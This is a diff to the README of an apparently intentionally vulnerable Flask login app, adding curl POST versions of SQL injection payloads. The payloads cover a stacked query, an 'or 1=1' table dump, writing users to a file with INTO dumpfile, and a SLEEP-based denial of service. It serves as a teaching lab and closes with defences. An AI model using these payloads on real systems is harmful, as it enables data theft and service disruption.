@@ -26,6 +26,7 @@ The backend is written with flask. In order to run the backend execute:
 export FLASK_APP=app.py
 python -m flask run
 ```
+The backend is listenig on localhost:5000
 ## Execute injections
 The vulnerability of this web app is in the username field:
 ``` SQL
@@ -37,6 +38,12 @@ Before executing the queries we need to determine the db name, we can do this us
 In the username field enter:
 ``` SQL
 test'; SELECT a(); #
+```
+Or in a POST request:
+``` bash
+curl --location --request POST 'localhost:5000/login' \
+--form 'email=test'\''; SELECT a(); #' \
+--form 'password=test'
 ```
 1. The first part is the original query:
     ``` SQL
@@ -54,6 +61,12 @@ In order to get all the users in the `account` table enter:
 ``` SQL
 test' or 1=1; #
 ```
+Or in a POST request:
+``` bash
+curl --location --request POST 'localhost:5000/login' \
+--form 'email=test'\'' or 1=1; #' \
+--form 'password=test'
+```
 Again, the second part is the injection cause it's always true. The result will be:
 ``` 
 [('Yakuza', 'aa', 'aa', 54725, 'yakuzarockz@japan.com', 9843059),
@@ -64,16 +77,26 @@ Again, the second part is the injection cause it's always true. The result will 
 ``` SQL
 test' or 1=1 INTO dumpfile '/tmp/users'; #
 ```
+Or in a POST request:
+``` bash
+curl --location --request POST 'localhost:5000/login' \
+--form 'email=test'\'' or 1=1 INTO dumpfile '\''/tmp/users'\''; #' \
+--form 'password=test'
+```
 This will write the users list to a file.
-
 ### Denial of service
 We can prevent the application from processing requests:
 ``` sql
 test'; SELECT IF(SUBSTRING(version(),1,1)=8,SLEEP(50),null); #
 ```
+Or in a POST request:
+``` bash
+curl --location --request POST 'localhost:5000/login' \
+--form 'email=test'\''; SELECT IF(SUBSTRING(version(),1,1)=8,SLEEP(50),null); #' \
+--form 'password=test'
+```
 If the database's major version is 8 the database wil sleep for 50 seconds.
 This is called blind sql injection because we dont need to know the internal database structure.
-
 ## Protect againts SQL injection
 In order to protect from sql injection the developer need to pay close attentions when using parameters in an sql query.
 Some precations that can be applied:
